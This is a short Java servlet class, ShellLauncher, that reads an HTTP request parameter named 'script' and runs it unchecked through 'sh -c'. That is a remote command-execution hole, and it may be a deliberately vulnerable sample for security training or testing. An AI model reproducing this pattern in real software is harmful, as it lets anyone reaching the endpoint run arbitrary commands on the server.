import java.io.IOException;
import javax.servlet.http.HttpServletRequest;

public class ShellLauncher {
    public void launch(HttpServletRequest req) throws IOException {
        String script = req.getParameter("script");
        ProcessBuilder pb = new ProcessBuilder("sh", "-c", script);
        pb.start();
    }
}
